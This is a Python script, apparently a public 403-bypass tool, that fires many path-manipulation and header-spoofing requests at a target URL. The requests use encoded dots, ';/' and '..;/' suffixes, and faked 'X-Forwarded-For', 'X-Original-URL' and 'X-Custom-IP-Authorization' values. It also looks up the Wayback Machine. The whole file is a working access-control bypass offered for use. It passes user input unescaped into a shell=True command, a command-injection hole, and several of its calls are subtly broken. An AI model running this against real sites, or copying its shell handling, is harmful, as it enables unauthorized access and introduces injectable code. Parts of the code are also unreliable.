import requests
import json
import subprocess

def run_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    return output.decode('latin-1'), error.decode('latin-1')

def bypass_403(url, path):
    ascii_art = """
 ____                              _  _    ___ _____ 
| __ ) _   _ _ __   __ _ ___ ___  | || |  / _ \\___ / 
|  _ \| | | | '_ \ / _` / __/ __| | || |_| | | ||_ \\ 
| |_) | |_| | |_) | (_| \__ \__ \ |__   _| |_| |__) |
|____/ \__, | .__/ \__,_|___/___/    |_|  \___/____/ 
       |___/|_|                                      
"""

    print(ascii_art)
    print("By 0xShe")
    print(f"Bypss403 Url： {url} {path}\n")

    def make_request(endpoint, header=None, method=None):
        full_url = f"{url}/{endpoint}"
        if header:
            response = requests.get(full_url, headers=header)
        elif method:
            response = requests.request(method, full_url)
        else:
            response = requests.get(full_url)

        print(f"  --> {full_url}")
        print(f"    状态码: {response.status_code}, 返回大小: {len(response.content)}\n")

    make_request(path)
    make_request("%2e/" + path)
    make_request(path + "/.")
    make_request("//" + path + "//")
    make_request("/./" + path + "/./")
    make_request(path, header={"X-Original-URL": path})
    make_request(path, header={"X-Custom-IP-Authorization": "127.0.0.1"})
    make_request(path, header={"X-Forwarded-For": "http://127.0.0.1"})
    make_request(path, header={"X-Forwarded-For": "127.0.0.1:80"})
    make_request(url, header={"X-rewrite-url": path})
    make_request(path + "%20")
    make_request(path + "%09")
    make_request(path + "?")
    make_request(path + ".html")
    make_request(path + "/?anything")
    make_request(path + "#")
    make_request(path, method="POST", header={"Content-Length": "0"})
    make_request(path + "/*")
    make_request(path + ".php")
    make_request(path + ".json")
    make_request(path, method="TRACE")
    make_request(path, header={"X-Host": "127.0.0.1"})
    make_request(path + "..;/")
    make_request(path + ";/")

    # Updated
    make_request(path, method="TRACE")
    make_request(path, header={"X-Forwarded-Host": "127.0.0.1"})

    # Way back machine
    print("Way back machine:")
    command = f'$url = "{url}/{path}" ; Invoke-RestMethod -Uri "https://archive.org/wayback/available?url=$url" | Select-Object -ExpandProperty archived_snapshots | Select-Object -ExpandProperty closest | Select-Object available, url'
    output, _ = run_command(command)
    json_data = json.loads(output)
    print(f"  --> available: {json_data['available']}, url: {json_data['url']}")

if __name__ == "__main__":
    url = input("输入URL: ")
    path = input("输入路径: ")
    bypass_403(url, path)
